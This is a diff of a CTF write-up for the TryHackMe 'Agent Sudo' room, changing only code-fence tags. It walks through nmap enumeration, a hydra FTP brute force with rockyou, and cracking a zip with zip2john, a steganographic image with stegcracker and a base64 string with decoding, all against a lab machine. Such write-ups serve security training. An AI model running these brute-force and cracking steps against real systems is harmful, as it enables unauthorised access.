@@ -31,7 +31,7 @@ I have replaced all instances of the virtual machine's ip address with `<target-
 
 We begin our enumeration efforts by running an `nmap` scan on the target machine to understand the ports that are open to network traffic. I start with the `-V`, `-C`, and `-T4` flags. 
 
-```bash
+```
 # Nmap 7.92 scan initiated Mon May 23 09:23:53 2022 as: nmap -sVC -T4 -o initial-svc-nmap.out 10.10.166.253
 Nmap scan report for 10.10.166.253
 Host is up (0.13s latency).
@@ -101,7 +101,7 @@ We're greeted with a message from Agent R, instructing other agents to change th
 ```
 
 Likewise, user-agents `A` and `B` do not work, but `C` redirects us to `/agent_C_attention.php` on the web site:
-```html
+```
 Attention ----s, <br><br>
 
 Do you still remember our deal? Please tell agent J about the stuff ASAP. Also, change your god damn password, is weak! <br><br>
@@ -111,7 +111,7 @@ Agent R
 ```
 Out of curiosity, I tried `J` as a user-agent, but that did not yield anything. However, now that we know about a user named `----s`, we should see if we can access the vsftpd FTP server on port 21. I chose to use `hydra` to attempt to brute force the server. This process went extremely slowly, unfortunately, with several disconnections from the remote host. I assume that this has to do with some form of rate limiting.
 
-```shell
+```
 ┌──(virtualtack㉿kali-bot)-[~/thm/agent-sudo]
 └─$ hydra -t 1 -l ----s -P /usr/share/wordlists/rockyou.txt -vV 10.10.73.189 ftp
 Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
@@ -144,7 +144,7 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-05-23 10:19:
 
 ```
 We test out our new credentials and discover three files on the FTP server that we can get. We download the text message first.
-```shell
+```
 ┌──(virtualtack㉿kali-bot)-[~/thm/agent-sudo]
 └─$ ftp 10.10.73.189 
 Connected to 10.10.73.189.
@@ -174,7 +174,7 @@ ftp> exit
 ```
 
 `To_agentJ.txt`
-```shell
+```
 Dear agent J,
 
 All these alien like photos are fake! Agent R stored the real picture inside your directory. Your login password is somehow stored in the fake picture. It shouldn't be a problem for you.
@@ -185,7 +185,7 @@ Agent C
 
 Good to know! Let's grab the image files and figure out how to extract Agent J's login password.
 
-```shell
+```
 ┌──(virtualtack㉿kali-bot)-[~/thm/agent-sudo]
 └─$ ftp 10.10.73.189 
 Connected to 10.10.73.189.
@@ -225,7 +225,7 @@ I should have used `mget *` here instead. Looking at the two images, I don't see
 I spent a while viewing the files but don't get anywhere. So I consult the internet. Turns out the clever agents hid a text string inside a data file [you can do this with binaries, too](https://www.howtogeek.com/427805/how-to-use-the-strings-command-on-linux/). Apparently everyone on the internet uses `binwalk` for this scenario. [Binwalk](https://www.kali.org/tools/binwalk/) is a tool for searching a given binary image for embedded files and executable code. Specifically, it is designed for identifying files and code embedded inside of firmware images. They must teach this stuff at spy school.
 
 Let's binwalk...
-```shell
+```
 ┌──(virtualtack㉿kali-bot)-[~/thm/agent-sudo]
 └─$ binwalk cutie.png
 
@@ -241,14 +241,14 @@ DECIMAL       HEXADECIMAL     DESCRIPTION
 `binwalk`, in its omnipotence, has a function to extract known file types, using the `-e` flag.
 
 We also now have the extracted contents of `cutie.png`
-```shell
+```
 ┌──(virtualtack㉿kali-bot)-[~/thm/agent-sudo/_cutie.png.extracted]
 └─$ ls
 365  365.zlib  8702.zip  To_agentR.txt
 ```
 
 Let's unzip the archive:
-```shell                                                            
+```                                                            
 ┌──(virtualtack㉿kali-bot)-[~/thm/agent-sudo/_cutie.png.extracted]
 └─$ 7z x 8702.zip
 
@@ -278,7 +278,7 @@ Sub items Errors: 1
 
 Usually `zip` passwords are pretty easy to break in CTFs. Let's see if that's true here:
 
-```shell
+```
 ┌──(virtualtack㉿kali-bot)-[~/thm/agent-sudo/_cutie.png.extracted]
 └─$ zip2john 8702.zip > 4john
                                                                     
@@ -304,7 +304,7 @@ Session completed.
 ```
 
 It is true. Now we can use `----n` to access the archive and read the contents of `To_agentR.txt`.
-```text
+```
 Agent C,
 
 We need to send the picture to '-------x' as soon as possible!
@@ -316,7 +316,7 @@ Agent R
 
 As the result of doing a few CTFs, the name of the picture recipient looks suspiciously like it is encoded in base64. As a reminder: **base64 is not encryption**. This is apparently a [big deal](https://twitter.com/sempf/status/988525614444539904) [for kubernetes folks](https://github.com/sethvargo/base64-is-not-encryption). 
 
-```shell
+```
 ┌──(virtualtack㉿kali-bot)-[~/thm/agent-sudo/_cutie.png.extracted]
 └─$ touch -------x.txt
                                                                     
@@ -332,7 +332,7 @@ Reading other write-ups after finishing the box, I learned about [Cyber Chef](ht
 
 The next prompt on THM asks for the `steg password`. I don't know what that is, so I search for it and [stegcracker](https://www.kali.org/tools/stegcracker/) tops the list. Let's try it, in conjunction with our remaining alien image `cute-alien.jpg`
 
-```shell
+```
 ┌──(virtualtack㉿kali-bot)-[~/thm/agent-sudo]
 └─$ stegcracker cute-alien.jpg
 StegCracker 2.1.0 - (https://github.com/Paradoxis/StegCracker)
